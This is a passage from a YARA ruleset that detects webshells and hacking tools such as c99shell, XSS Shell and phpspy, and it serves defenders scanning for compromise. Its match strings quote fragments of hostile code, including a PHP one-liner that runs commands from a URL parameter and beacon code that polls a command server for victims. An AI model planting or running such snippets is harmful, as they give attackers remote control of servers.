		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8384-L8396"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a341270f9ebd01320a7490c12cb2e64c"
		logic_hash = "462c713e5d4fb6d0db91b14bfacdca73f780559ba2dad80988c356ee1a3d369d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
		$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"

	condition:
		all of them
}

rule SIGNATURE_BASE_Thelast_Index3_1
{
	meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41310217-b9a7-5360-80c4-7d0a3969f848"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8397-L8408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cceff6dc247aaa25512bad22120a14b4"
		logic_hash = "3700141ca2cf53f49618e2d4cab8866efccdce843921f1733b3d6260b8feea68"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"

	condition:
		all of them
}

rule SIGNATURE_BASE_Adjustcr_1
{
	meta:
		description = "Webshells Auto-generated - file adjustcr.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4b3d9409-60e8-502a-b37b-1e06d57c9b0b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8409-L8423"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17037fa684ef4c90a25ec5674dac2eb6"
		logic_hash = "d2a86083ff5cb34a0453f812e2d316c63342e529f00099a8869fa7e0a43321ef"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$Info: This file is packed with the UPX executable packer $"
		$s2 = "$License: NRV for UPX is distributed under special license $"
		$s6 = "AdjustCR Carr"
		$s7 = "ION\\System\\FloatingPo"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Apppack_2005_1
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "67c86d16-a962-5502-8c39-0a6e3dc04031"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8436-L8447"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		logic_hash = "0de4800291132efca24b40bebcc895d6873110214c8cbf8384317208e0d9db82"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_1
{
	meta:
		description = "Webshells Auto-generated - file xssshell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ef89653c-5814-525a-b04e-4326a80f780c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8448-L8459"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8fc0ffc5e5fbe85f7706ffc45b3f79b4"
		logic_hash = "6b0e602b523f58ec61850b4ba2e69da4fe4bf2833fb45e529785a398445db127"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Usr_1
{
	meta:
		description = "Webshells Auto-generated - file usr.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ab1825fe-96aa-5d97-acd6-eac43a12b237"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8460-L8471"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ade3357520325af50c9098dc8a21a024"
		logic_hash = "f5fd4a4c1b531b23b09505d302dc27d7ba2eb733fcf313c04ba9085b090f7cbe"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phpinj_1
{
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5d84d518-0e18-517f-890b-e296ac265c50"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8472-L8483"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		logic_hash = "de4ac200f5426ec4c6fef21d5fbc37281811569a3e71a9bcb6fa51d13eb600a4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Db_1
{
	meta:
		description = "Webshells Auto-generated - file db.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "94bb2297-95a2-5442-bb16-fb079a29606e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8484-L8495"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cb62e2ec40addd4b9930a9e270f5b318"
		logic_hash = "3fdbaa17c12abef8576bf859065d90f4b6e80c187af734b71b26a1bd5d073e86"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Sh_1
{
	meta:
		description = "Webshells Auto-generated - file sh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8496-L8507"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1e9e879d49eb0634871e9b36f99fe528"
		logic_hash = "da0b572f116cc5c55e8d7469f222896d602d09be4761a0e2139fc8ce67ac4050"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Default_1
{
	meta:
		description = "Webshells Auto-generated - file default.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "1c221572-4cb5-5806-a856-0f857dba230a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8508-L8519"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d156782ae5e0b3724de3227b42fcaf2f"
		logic_hash = "6a8772a8a6399c3266abcc22a3c55eda70ec9703346398f5f1768bbd35974f8c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Editserver_2_1
{
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bd254bd9-fd23-5807-9347-2a559089b7c5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8520-L8533"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5c1f25a4d206c83cdfb006b3eb4c09ba"
		logic_hash = "c581936928ce0f1061feb5665c743f14f12a9f875e360f40cc064f3047b23adf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@HOTMAIL.COM"
		$s1 = "Press Any Ke"
		$s3 = "glish MenuZ"

	condition:
		all of them
}

rule SIGNATURE_BASE_By064Cli_1
{
	meta:
		description = "Webshells Auto-generated - file by064cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9ea88f0c-9275-5567-a4d9-0545de8044d1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8534-L8546"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "10e0dff366968b770ae929505d2a9885"
		logic_hash = "51efd5c510efc6657ae175af47b09437ae70eb0237d88ffdf3cdae365d0ec7be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "packet dropped,redirecting"
		$s9 = "input the password(the default one is 'by')"

	condition:
		all of them
}

rule SIGNATURE_BASE_Peek_A_Boo_1
{
	meta:
		description = "Webshells Auto-generated - file peek-a-boo.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "f6ca33b5-e37f-5124-a193-a3056c559314"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8560-L8576"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aca339f60d41fdcba83773be5d646776"
		logic_hash = "b103c1b873dd0df9626d72a1127fbadc821777a05012a080423263a2083c398b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "__vbaHresultCheckObj"
		$s1 = "\\VB\\VB5.OLB"
		$s2 = "capGetDriverDescriptionA"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s8 = "__vbaErrorOverflow"

	condition:
		all of them
}

rule SIGNATURE_BASE_Fmlibraryv3_1
{
	meta:
		description = "Webshells Auto-generated - file fmlibraryv3.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9b8ef79d-80bb-5a05-91e6-0f2bc3fd3068"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8577-L8588"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c34c248fed6d5a20d8203924a2088acc"
		logic_hash = "a7dc83db26cdda757f626c42022c17bb2764074a3cc5f87b4a3aaa991fac5dc2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"

	condition:
		all of them
}

rule SIGNATURE_BASE_Connector_1
{
	meta:
		description = "Webshells Auto-generated - file connector.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e46026bc-c570-5057-a132-5a459c959a69"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8602-L8614"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3ba1827fca7be37c8296cd60be9dc884"
		logic_hash = "b8cadb7aa23a8cdef10e7b1eb05586d6c3e7c398958a80861b6f1ccd4edf1eca"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "If ( AttackID = BROADCAST_ATTACK )"
		$s4 = "Add UNIQUE ID for victims / zombies"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Hiderun_1
{
	meta:
		description = "Webshells Auto-generated - file HideRun.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dd71dbef-5b5d-5976-8b95-0f202a4b4795"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8615-L8627"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "45436d9bfd8ff94b71eeaeb280025afe"
		logic_hash = "3a6dea2314800b28e92b59595c8b79c64e66dc66ebfa8f89c2f4028b574b9a91"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Usage -- hiderun [AppName]"
		$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Shell_V1_7_1
{
	meta:
		description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
		author = "Florian Roth (Nextron Systems)"
		id = "7eb69ac3-90bb-5a44-8dcd-e71f5edcf18f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8628-L8639"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b5978501c7112584532b4ca6fb77cba5"
		logic_hash = "e03904177309de9ce1afa0b12bf70913b106650c3db5807f9d4ccb91fb2ade77"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Save_1
{
	meta:
		description = "Webshells Auto-generated - file save.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f33c7559-e2f7-5223-a0e9-4e1d3bc7f080"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8640-L8652"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "865da1b3974e940936fe38e8e1964980"
		logic_hash = "c53034c6ebc4f01c4573e688f548e71dae944913797b12eb8f22a5ef0a368ccf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
		$s5 = "VictimID = fm_NStr(Victims(i))"

	condition:
		all of them
}

rule SIGNATURE_BASE_Screencap_1
{
	meta:
		description = "Webshells Auto-generated - file screencap.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0c1b71d3-ad54-5230-b1ab-971647e76139"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8653-L8666"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "51139091dea7a9418a50f2712ea72aa6"
		logic_hash = "9be7ec97ef8e9b8838f7931a8fcf8d85b1543a202a7bf34fab9791fc47889cb9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "GetDIBColorTable"
		$s1 = "Screen.bmp"
		$s2 = "CreateDCA"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phpinj_2_1
{
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Florian Roth (Nextron Systems)"
		id = "db8f835e-eb13-50f3-a60b-7d8ffcaa5eaa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8667-L8678"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		logic_hash = "12af5182b94f01ac4fbdee92c007556aaa7f196aca116575803cedd84b81f3b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Zxrecv_1
{
	meta:
		description = "Webshells Auto-generated - file zxrecv.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d36541f-dd55-5385-8e2b-598ad78bdf73"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8679-L8696"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5d3d12a39f41d51341ef4cb7ce69d30f"
		logic_hash = "7eef63e45f6902e4f2d5f854b2794df3101a2ef145e2d627263db429c2b728d7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RyFlushBuff"
		$s1 = "teToWideChar^FiYP"
		$s2 = "mdesc+8F D"
		$s3 = "\\von76std"
		$s4 = "5pur+virtul"
		$s5 = "- Kablto io"
		$s6 = "ac#f{lowi8a"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ajan_1
{
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "03bf98b9-c8c5-5b9f-b0cd-700c5ed58eac"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8697-L8708"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		logic_hash = "a7766caae5845ce43cff2212c25fea9a78979d10c79d8c40290b5c1471b101cd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "entrika.write \"BinaryStream.SaveToFile"

	condition:
		all of them
}

rule SIGNATURE_BASE_C99Shell_1
{
	meta:
		description = "Webshells Auto-generated - file c99shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8709-L8720"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "90b86a9c63e2cd346fe07cea23fbfc56"
		logic_hash = "a0fcc43a80ac4d059aea36da8b4b5a81c99a54f7c66c521697805ae890d66fe8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpspy_2005_Full_1
{
	meta:
		description = "Webshells Auto-generated - file phpspy_2005_full.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8721-L8732"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d1c69bb152645438440e6c903bac16b2"
		logic_hash = "8561161726a49374a9bc3389fef593e5d68dc437552e06736a235412183bef45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Zehir4_2_1
{
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7de89d22-0230-508a-ac50-f61730ad9f4e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8733-L8744"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		logic_hash = "bb10f2e28bb375366b9140c06bb242cd13fdb69e67ce72ecae0e50270566f116"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "\"Program Files\\Serv-u\\Serv"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Indexer_2_1
{
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "8ef79a60-fa8c-51ee-bd87-f5467a66099b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8745-L8756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "135fc50f85228691b401848caef3be9e"
		logic_hash = "8cf4c8fb1e985adbed2cf20578fcfc14240f6d9fe6062bbe3fe2f895f58bc172"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_2005_1
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8757-L8770"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		logic_hash = "b312cddff4c5292cc51acc39448c815fede3c9356d7d225c3a08c7124712b3f8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
		$s8 = "scrollbar-darkshadow-color:#9C9CD3;"
		$s9 = "scrollbar-face-color:#E4E4F3;"

	condition:
		all of them
}

rule SIGNATURE_BASE__Root_040_Zip_Folder_Deploy_1
{
	meta:
		description = "Webshells Auto-generated - file deploy.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7e592ab2-8a53-59d5-a45d-971398586479"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8771-L8784"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2c9f9c58999256c73a5ebdb10a9be269"
		logic_hash = "9852b105e6a28f5500fc6739b196dd14b9b0b69b1077be4063735380b0699abb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "halon synscan 127.0.0.1 1-65536"
		$s8 = "Obviously you replace the ip address with that of the target."

	condition:
		all of them
}

rule SIGNATURE_BASE_By063Cli_1
{
	meta:
		description = "Webshells Auto-generated - file by063cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9b4a4842-e084-53e8-90fb-603ba034b7df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8785-L8797"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "49ce26eb97fd13b6d92a5e5d169db859"
		logic_hash = "c89159b73232bc8fd7430b3330009f4b3eb25b9511515bc9b4cd433f7a67f30e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "#popmsghello,are you all right?"
		$s4 = "connect failed,check your network and remote ip."

	condition:
		all of them
}

rule SIGNATURE_BASE_Icyfox007V1_10_Rar_Folder_Asp_1
{
	meta:
		description = "Webshells Auto-generated - file asp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "52150b6a-2f60-5e6b-86d1-61bc0aeb4fa8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8798-L8809"
